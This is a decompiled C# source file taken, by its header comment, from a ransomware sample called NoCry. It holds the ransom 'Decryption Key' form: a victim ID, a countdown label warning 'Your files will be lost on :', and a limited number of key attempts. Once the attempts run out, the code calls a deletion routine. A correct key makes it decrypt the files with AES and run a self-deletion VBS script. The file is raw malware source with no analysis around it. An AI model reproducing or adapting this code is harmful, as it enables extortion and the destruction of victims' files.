// Decompiled with JetBrains decompiler
// Type: NoCry.Form2
// Assembly: Stub, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D065D6FB-0B25-4594-BF1F-FFB7B28602E9
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.07\HEUR-Trojan-Ransom.Win32.Generic-a9a0a2e8c6150a5588fc69d5d65859d5c670f52f5dc5ff087bd0203e1cf5fa75.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using NoCry.My;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Windows.Forms;

namespace NoCry
{
  [DesignerGenerated]
  public class Form2 : Form
  {
    private IContainer components;
    private FileStream fsInput;
    private FileStream fsOutput;
    private byte[] bytKey;
    private byte[] bytIV;
    private object cntAttempts;
    private object h;

    public Form2()
    {
      this.FormClosing += new FormClosingEventHandler(this.Form2_FormClosing);
      this.Load += new EventHandler(this.Form2_Load);
      this.cntAttempts = (object) 0;
      this.h = (object) Interaction.GetSetting("T", "0", St.Setting);
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.TextBox1 = new TextBox();
      this.Label6 = new Label();
      this.Button1 = new Button();
      this.Label1 = new Label();
      this.BackgroundWorker1 = new BackgroundWorker();
      this.Panel1 = new Panel();
      this.Label10 = new Label();
      this.ProgressBar1 = new ProgressBar();
      this.Label2 = new Label();
      this.PictureBox1 = new PictureBox();
      this.Label3 = new Label();
      this.TextBox2 = new TextBox();
      this.Button2 = new Button();
      this.Button3 = new Button();
      this.Panel1.SuspendLayout();
      ((ISupportInitialize) this.PictureBox1).BeginInit();
      this.SuspendLayout();
      this.TextBox1.ForeColor = Color.Red;
      this.TextBox1.Location = new Point(77, 60);
      this.TextBox1.Margin = new Padding(4);
      this.TextBox1.Name = "TextBox1";
      this.TextBox1.Size = new Size(423, 22);
      this.TextBox1.TabIndex = 0;
      this.Label6.AutoSize = true;
      this.Label6.Font = new Font("Tahoma", 9.75f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.Label6.ForeColor = Color.White;
      this.Label6.Location = new Point(16, 62);
      this.Label6.Margin = new Padding(4, 0, 4, 0);
      this.Label6.Name = "Label6";
      this.Label6.Size = new Size(51, 21);
      this.Label6.TabIndex = 10;
      this.Label6.Text = "key :";
      this.Button1.BackColor = Color.White;
      this.Button1.Cursor = Cursors.Hand;
      this.Button1.ForeColor = Color.Black;
      this.Button1.Location = new Point(4, 78);
      this.Button1.Margin = new Padding(4);
      this.Button1.Name = "Button1";
      this.Button1.Size = new Size(173, 32);
      this.Button1.TabIndex = 11;
      this.Button1.Text = "Decrypt";
      this.Button1.UseVisualStyleBackColor = false;
      this.Label1.AutoSize = true;
      this.Label1.Font = new Font("Tahoma", 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.Label1.ForeColor = Color.White;
      this.Label1.Location = new Point(16, 230);
      this.Label1.Margin = new Padding(4, 0, 4, 0);
      this.Label1.Name = "Label1";
      this.Label1.Size = new Size(20, 17);
      this.Label1.TabIndex = 12;
      this.Label1.Text = "...";
      this.Panel1.BackColor = Color.Firebrick;
      this.Panel1.BorderStyle = BorderStyle.Fixed3D;
      this.Panel1.Controls.Add((Control) this.Label10);
      this.Panel1.Controls.Add((Control) this.ProgressBar1);
      this.Panel1.Controls.Add((Control) this.Button1);
      this.Panel1.Controls.Add((Control) this.Label2);
      this.Panel1.ForeColor = Color.White;
      this.Panel1.Location = new Point(315, 92);
      this.Panel1.Margin = new Padding(4);
      this.Panel1.Name = "Panel1";
      this.Panel1.Size = new Size(185, 120);
      this.Panel1.TabIndex = 13;
      this.Label10.AutoSize = true;
      this.Label10.ForeColor = Color.White;
      this.Label10.Location = new Point(4, 5);
      this.Label10.Margin = new Padding(4, 0, 4, 0);
      this.Label10.Name = "Label10";
      this.Label10.Size = new Size(150, 16);
      this.Label10.TabIndex = 15;
      this.Label10.Text = "Your files will be lost on :";
      this.ProgressBar1.Location = new Point(4, 55);
      this.ProgressBar1.Margin = new Padding(4);
      this.ProgressBar1.Name = "ProgressBar1";
      this.ProgressBar1.Size = new Size(173, 15);
      this.ProgressBar1.TabIndex = 5;
      this.Label2.AutoSize = true;
      this.Label2.Location = new Point(4, 36);
      this.Label2.Margin = new Padding(4, 0, 4, 0);
      this.Label2.Name = "Label2";
      this.Label2.Size = new Size(16, 16);
      this.Label2.TabIndex = 3;
      this.Label2.Text = "...";
      this.PictureBox1.Image = (Image) NoCry.My.Resources.Resources.key;
      this.PictureBox1.Location = new Point(77, 113);
      this.PictureBox1.Margin = new Padding(4);
      this.PictureBox1.Name = "PictureBox1";
      this.PictureBox1.Size = new Size(185, 91);
      this.PictureBox1.SizeMode = PictureBoxSizeMode.StretchImage;
      this.PictureBox1.TabIndex = 14;
      this.PictureBox1.TabStop = false;
      this.Label3.AutoSize = true;
      this.Label3.Font = new Font("Tahoma", 9.75f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.Label3.ForeColor = Color.White;
      this.Label3.Location = new Point(28, 28);
      this.Label3.Margin = new Padding(4, 0, 4, 0);
      this.Label3.Name = "Label3";
      this.Label3.Size = new Size(42, 21);
      this.Label3.TabIndex = 16;
      this.Label3.Text = "ID :";
      this.TextBox2.ForeColor = Color.Red;
      this.TextBox2.Location = new Point(77, 27);
      this.TextBox2.Margin = new Padding(4);
      this.TextBox2.Name = "TextBox2";
      this.TextBox2.ReadOnly = true;
      this.TextBox2.Size = new Size(353, 22);
      this.TextBox2.TabIndex = 15;
      this.Button2.BackColor = Color.White;
      this.Button2.Cursor = Cursors.Hand;
      this.Button2.ForeColor = Color.Black;
      this.Button2.Location = new Point(440, 25);
      this.Button2.Margin = new Padding(4);
      this.Button2.Name = "Button2";
      this.Button2.Size = new Size(61, 28);
      this.Button2.TabIndex = 17;
      this.Button2.Text = "Copy";
      this.Button2.UseVisualStyleBackColor = false;
      this.Button3.BackColor = Color.Red;
      this.Button3.Location = new Point(419, 224);
      this.Button3.Name = "Button3";
      this.Button3.Size = new Size(75, 23);
      this.Button3.TabIndex = 18;
      this.Button3.Text = "Exit";
      this.Button3.UseVisualStyleBackColor = false;
      this.AutoScaleDimensions = new SizeF(8f, 16f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.AutoSizeMode = AutoSizeMode.GrowAndShrink;
      this.BackColor = Color.Maroon;
      this.ClientSize = new Size(517, 257);
      this.Controls.Add((Control) this.Button3);
      this.Controls.Add((Control) this.Button2);
      this.Controls.Add((Control) this.Label3);
      this.Controls.Add((Control) this.TextBox2);
      this.Controls.Add((Control) this.PictureBox1);
      this.Controls.Add((Control) this.Panel1);
      this.Controls.Add((Control) this.Label1);
      this.Controls.Add((Control) this.Label6);
      this.Controls.Add((Control) this.TextBox1);
      this.ForeColor = SystemColors.ControlText;
      this.FormBorderStyle = FormBorderStyle.None;
      this.Margin = new Padding(4);
      this.MaximizeBox = false;
      this.MinimizeBox = false;
      this.Name = nameof (Form2);
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.StartPosition = FormStartPosition.CenterScreen;
      this.Text = "Decryption Key";
      this.Panel1.ResumeLayout(false);
      this.Panel1.PerformLayout();
      ((ISupportInitialize) this.PictureBox1).EndInit();
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    [field: AccessedThroughProperty("TextBox1")]
    internal virtual TextBox TextBox1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("Label6")]
    internal virtual Label Label6 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual Button Button1
    {
      get => this._Button1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Button1_Click);
        Button button1_1 = this._Button1;
        if (button1_1 != null)
          button1_1.Click -= eventHandler;
        this._Button1 = value;
        Button button1_2 = this._Button1;
        if (button1_2 == null)
          return;
        button1_2.Click += eventHandler;
      }
    }

    [field: AccessedThroughProperty("Label1")]
    internal virtual Label Label1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual BackgroundWorker BackgroundWorker1
    {
      get => this._BackgroundWorker1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        DoWorkEventHandler workEventHandler = new DoWorkEventHandler(this.BackgroundWorker1_DoWork);
        BackgroundWorker backgroundWorker1_1 = this._BackgroundWorker1;
        if (backgroundWorker1_1 != null)
          backgroundWorker1_1.DoWork -= workEventHandler;
        this._BackgroundWorker1 = value;
        BackgroundWorker backgroundWorker1_2 = this._BackgroundWorker1;
        if (backgroundWorker1_2 == null)
          return;
        backgroundWorker1_2.DoWork += workEventHandler;
      }
    }

    [field: AccessedThroughProperty("Panel1")]
    internal virtual Panel Panel1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("ProgressBar1")]
    internal virtual ProgressBar ProgressBar1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual Label Label2
    {
      get => this._Label2;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Label2_Click);
        Label label2_1 = this._Label2;
        if (label2_1 != null)
          label2_1.Click -= eventHandler;
        this._Label2 = value;
        Label label2_2 = this._Label2;
        if (label2_2 == null)
          return;
        label2_2.Click += eventHandler;
      }
    }

    [field: AccessedThroughProperty("Label10")]
    internal virtual Label Label10 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("PictureBox1")]
    internal virtual PictureBox PictureBox1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("Label3")]
    internal virtual Label Label3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("TextBox2")]
    internal virtual TextBox TextBox2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual Button Button2
    {
      get => this._Button2;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Button2_Click);
        Button button2_1 = this._Button2;
        if (button2_1 != null)
          button2_1.Click -= eventHandler;
        this._Button2 = value;
        Button button2_2 = this._Button2;
        if (button2_2 == null)
          return;
        button2_2.Click += eventHandler;
      }
    }

    internal virtual Button Button3
    {
      get => this._Button3;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Button3_Click);
        Button button3_1 = this._Button3;
        if (button3_1 != null)
          button3_1.Click -= eventHandler;
        this._Button3 = value;
        Button button3_2 = this._Button3;
        if (button3_2 == null)
          return;
        button3_2.Click += eventHandler;
      }
    }

    private void Form2_FormClosing(object sender, FormClosingEventArgs e)
    {
      if (e.CloseReason != CloseReason.UserClosing || !(Operators.CompareString(this.Label1.Text, "Please Wait...", false) == 0 | Operators.CompareString(this.Label1.Text, "Done!", false) == 0))
        return;
      e.Cancel = true;
    }

    private void Form2_Load(object sender, EventArgs e)
    {
      try
      {
        this.ProgressBar1.Maximum = Conversions.ToInteger(St.Attempts);
        if (Operators.ConditionalCompareObjectEqual(this.h, (object) null, false))
        {
          Interaction.SaveSetting("T", "0", St.Setting, Conversions.ToString(this.cntAttempts));
          this.cntAttempts = (object) Interaction.GetSetting("T", "0", St.Setting);
          this.Label2.Text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(this.cntAttempts, (object) "/"), (object) St.Attempts), (object) " Attempts"));
          this.ProgressBar1.Value = Conversions.ToInteger(this.cntAttempts);
        }
        else
        {
          this.cntAttempts = (object) Interaction.GetSetting("T", "0", St.Setting);
          this.Label2.Text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(this.cntAttempts, (object) "/"), (object) St.Attempts), (object) " Attempts"));
          this.ProgressBar1.Value = Conversions.ToInteger(this.cntAttempts);
        }
        this.TextBox2.Text = St.hash;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void Button1_Click(object sender, EventArgs e)
    {
      if (check.AES_Decrypt(Interaction.GetSetting("G", "0", St.Setting), this.TextBox1.Text))
      {
        this.Label1.Text = "Please Wait...";
        MyProject.Forms.Form1.Timer1.Stop();
        this.bytKey = this.CreateKey(this.TextBox1.Text);
        this.bytIV = this.CreateIV(this.TextBox1.Text);
        this.Button1.Enabled = false;
        this.TextBox1.Enabled = false;
        this.BackgroundWorker1.WorkerReportsProgress = true;
        this.BackgroundWorker1.WorkerSupportsCancellation = true;
        this.BackgroundWorker1.RunWorkerAsync();
      }
      else
      {
        int num = (int) Interaction.MsgBox((object) "Incorrect Key", MsgBoxStyle.Critical);
        this.TextBox1.Clear();
        if (Operators.ConditionalCompareObjectEqual(this.cntAttempts, (object) St.Attempts, false))
        {
          this.Hide();
          this.Button1.Enabled = false;
          this.TextBox1.Enabled = false;
          Interaction.SaveSetting("D", "0", St.Setting, "OK");
          del.del();
        }
        else
        {
          // ISSUE: variable of a reference type
          object& local;
          // ISSUE: explicit reference operation
          object obj = Operators.AddObject(^(local = ref this.cntAttempts), (object) 1);
          local = obj;
          this.Label2.Text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(this.cntAttempts, (object) "/"), (object) St.Attempts), (object) " Attempts"));
          Interaction.SaveSetting("T", "0", St.Setting, Conversions.ToString(this.cntAttempts));
          this.ProgressBar1.Increment(1);
        }
      }
    }

    private void EncryptOrDecryptFile(
      string strInputFile,
      string strOutputFile,
      byte[] bytKey,
      byte[] bytIV,
      Form2.CryptoAction Direction)
    {
      int num1;
      int num2;
      try
      {
label_2:
        ProjectData.ClearProjectError();
        num1 = -2;
label_3:
        int num3 = 2;
        this.fsInput = new FileStream(strInputFile, FileMode.Open, FileAccess.Read);
label_4:
        num3 = 3;
        this.fsOutput = new FileStream(strOutputFile, FileMode.OpenOrCreate, FileAccess.Write);
label_5:
        num3 = 4;
        this.fsOutput.SetLength(0L);
label_6:
        num3 = 5;
        byte[] numArray = new byte[4097];
label_7:
        num3 = 6;
        long num4 = 0;
label_8:
        num3 = 7;
        long length = this.fsInput.Length;
label_9:
        num3 = 8;
        RijndaelManaged rijndaelManaged = new RijndaelManaged();
label_10:
        num3 = 9;
        if (Direction != Form2.CryptoAction.ActionDecrypt)
          goto label_12;
label_11:
        num3 = 11;
        CryptoStream cryptoStream = new CryptoStream((Stream) this.fsOutput, rijndaelManaged.CreateDecryptor(bytKey, bytIV), CryptoStreamMode.Write);
label_12:
        goto label_17;
label_13:
        num3 = 15;
        int count = this.fsInput.Read(numArray, 0, 4096);
label_14:
        num3 = 16;
        cryptoStream.Write(numArray, 0, count);
label_15:
        num3 = 17;
        checked { num4 += (long) count; }
label_16:
label_17:
        num3 = 14;
        if (num4 < length)
          goto label_13;
label_18:
        num3 = 19;
        cryptoStream.Close();
label_19:
        num3 = 20;
        this.fsInput.Close();
label_20:
        num3 = 21;
        this.fsOutput.Close();
label_21:
        num3 = 22;
        if (Direction != Form2.CryptoAction.ActionDecrypt)
          goto label_25;
label_22:
        num3 = 23;
        FileInfo fileInfo1 = new FileInfo(strInputFile);
label_23:
        num3 = 24;
        fileInfo1.Delete();
label_24:
label_25:
label_26:
        num3 = 26;
        if (Direction != Form2.CryptoAction.ActionDecrypt)
          goto label_30;
label_27:
        num3 = 27;
        FileInfo fileInfo2 = new FileInfo(strInputFile);
label_28:
        num3 = 28;
        fileInfo2.Delete();
label_29:
label_30:
        goto label_37;
label_32:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num5 = num2 + 1;
            num2 = 0;
            switch (num5)
            {
              case 1:
                goto label_2;
              case 2:
                goto label_3;
              case 3:
                goto label_4;
              case 4:
                goto label_5;
              case 5:
                goto label_6;
              case 6:
                goto label_7;
              case 7:
                goto label_8;
              case 8:
                goto label_9;
              case 9:
                goto label_10;
              case 10:
              case 12:
                goto label_12;
              case 11:
                goto label_11;
              case 13:
              case 14:
                goto label_17;
              case 15:
                goto label_13;
              case 16:
                goto label_14;
              case 17:
                goto label_15;
              case 18:
                goto label_16;
              case 19:
                goto label_18;
              case 20:
                goto label_19;
              case 21:
                goto label_20;
              case 22:
                goto label_21;
              case 23:
                goto label_22;
              case 24:
                goto label_23;
              case 25:
                goto label_24;
              case 26:
                goto label_26;
              case 27:
                goto label_27;
              case 28:
                goto label_28;
              case 29:
                goto label_29;
              case 30:
                goto label_37;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_32;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_37:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    private byte[] CreateKey(string strPassword)
    {
      char[] charArray = strPassword.ToCharArray();
      byte[] buffer = new byte[checked (charArray.GetUpperBound(0) + 1)];
      int upperBound = charArray.GetUpperBound(0);
      int index1 = 0;
      while (index1 <= upperBound)
      {
        buffer[index1] = checked ((byte) Strings.Asc(charArray[index1]));
        checked { ++index1; }
      }
      byte[] hash = new SHA512Managed().ComputeHash(buffer);
      byte[] key = new byte[32];
      int index2 = 0;
      do
      {
        key[index2] = hash[index2];
        checked { ++index2; }
      }
      while (index2 <= 31);
      return key;
    }

    private byte[] CreateIV(string strPassword)
    {
      char[] charArray = strPassword.ToCharArray();
      byte[] buffer = new byte[checked (charArray.GetUpperBound(0) + 1)];
      int upperBound = charArray.GetUpperBound(0);
      int index1 = 0;
      while (index1 <= upperBound)
      {
        buffer[index1] = checked ((byte) Strings.Asc(charArray[index1]));
        checked { ++index1; }
      }
      byte[] hash = new SHA512Managed().ComputeHash(buffer);
      byte[] iv = new byte[16];
      int index2 = 32;
      do
      {
        iv[checked (index2 - 32)] = hash[index2];
        checked { ++index2; }
      }
      while (index2 <= 47);
      return iv;
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    private void BackgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
    {
      int num1;
      int num2;
      try
      {
label_2:
        ProjectData.ClearProjectError();
        num1 = -2;
label_3:
        int num3 = 2;
        this.Button1.Enabled = false;
label_4:
        num3 = 3;
        int count = Form4.listenc.Count;
label_5:
        num3 = 4;
        this.Text = "Decryption : Working * " + Conversions.ToString(count);
label_6:
        num3 = 5;
        List<string>.Enumerator enumerator = Form4.listenc.GetEnumerator();
        goto label_15;
label_8:
        num3 = 6;
        string current;
        if (!File.Exists(current))
          goto label_13;
label_9:
        num3 = 7;
        this.EncryptOrDecryptFile(current, current.Replace(St.exs, ""), this.bytKey, this.bytIV, Form2.CryptoAction.ActionDecrypt);
label_10:
        num3 = 8;
        checked { --count; }
label_11:
        num3 = 9;
        this.Text = "Decryption : Working * " + Conversions.ToString(count);
label_12:
label_13:
label_14:
        num3 = 11;
label_15:
        if (enumerator.MoveNext())
        {
          current = enumerator.Current;
          goto label_8;
        }
label_16:
        num3 = 12;
        enumerator.Dispose();
label_17:
        num3 = 13;
        Form4.listenc.Clear();
label_18:
        num3 = 14;
        Interaction.SaveSetting("P", "0", St.Setting, "");
label_19:
        num3 = 15;
        Interaction.SaveSetting("H", "0", St.Setting, "");
label_20:
        num3 = 16;
        Interaction.SaveSetting("M", "0", St.Setting, "");
label_21:
        num3 = 17;
        Interaction.SaveSetting("S", "0", St.Setting, "");
label_22:
        num3 = 18;
        Interaction.SaveSetting("X", "0", St.Setting, "");
label_23:
        num3 = 19;
        Interaction.SaveSetting("D", "0", St.Setting, "");
label_24:
        num3 = 20;
        Interaction.SaveSetting("T", "0", St.Setting, "");
label_25:
        num3 = 21;
        Interaction.SaveSetting("G", "0", St.Setting, "");
label_26:
        num3 = 22;
        Interaction.SaveSetting("F", "0", St.Setting, "");
label_27:
        num3 = 23;
        Interaction.SaveSetting("C", "0", St.Setting, "");
label_28:
        num3 = 24;
        this.Label1.Text = "Done!";
label_29:
        num3 = 25;
        if (!File.Exists(St.html))
          goto label_32;
label_30:
        num3 = 26;
        File.Delete(St.html);
label_31:
label_32:
label_33:
        num3 = 28;
        int num4 = (int) Interaction.MsgBox((object) "Decryption completed successfully!", MsgBoxStyle.Information);
label_34:
        num3 = 29;
        string str1 = NoCry.My.Resources.Resources.del;
label_35:
        num3 = 30;
        string str2 = Path.GetTempPath() + "del.vbs";
label_36:
        num3 = 31;
        str1 = str1.Replace("%path%", Application.ExecutablePath);
label_37:
        num3 = 32;
        str1 = str1.Replace("%startup%", Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + St.mute + ".exe");
label_38:
        num3 = 33;
        StreamWriter streamWriter = new StreamWriter(str2, false);
label_39:
        num3 = 34;
        streamWriter.WriteLine(str1);
label_40:
        num3 = 35;
        streamWriter.Close();
label_41:
        num3 = 36;
        Process.Start(str2);
        ProjectData.EndApp();
        goto label_48;
label_43:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num5 = num2 + 1;
            num2 = 0;
            switch (num5)
            {
              case 1:
                goto label_2;
              case 2:
                goto label_3;
              case 3:
                goto label_4;
              case 4:
                goto label_5;
              case 5:
                goto label_6;
              case 6:
                goto label_8;
              case 7:
                goto label_9;
              case 8:
                goto label_10;
              case 9:
                goto label_11;
              case 10:
                goto label_12;
              case 11:
                goto label_14;
              case 12:
                goto label_16;
              case 13:
                goto label_17;
              case 14:
                goto label_18;
              case 15:
                goto label_19;
              case 16:
                goto label_20;
              case 17:
                goto label_21;
              case 18:
                goto label_22;
              case 19:
                goto label_23;
              case 20:
                goto label_24;
              case 21:
                goto label_25;
              case 22:
                goto label_26;
              case 23:
                goto label_27;
              case 24:
                goto label_28;
              case 25:
                goto label_29;
              case 26:
                goto label_30;
              case 27:
                goto label_31;
              case 28:
                goto label_33;
              case 29:
                goto label_34;
              case 30:
                goto label_35;
              case 31:
                goto label_36;
              case 32:
                goto label_37;
              case 33:
                goto label_38;
              case 34:
                goto label_39;
              case 35:
                goto label_40;
              case 36:
                goto label_41;
              case 37:
                goto label_48;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_43;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_48:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    private void Button2_Click(object sender, EventArgs e)
    {
      try
      {
        Clipboard.SetText(this.TextBox2.Text);
        int num = (int) MessageBox.Show("Copied To Clipboard");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        int num = (int) MessageBox.Show(ex.Message);
        ProjectData.ClearProjectError();
      }
    }

    private void Label2_Click(object sender, EventArgs e)
    {
    }

    private void Button3_Click(object sender, EventArgs e) => Application.Exit();

    private enum CryptoAction
    {
      ActionDecrypt = 2,
    }
  }
}
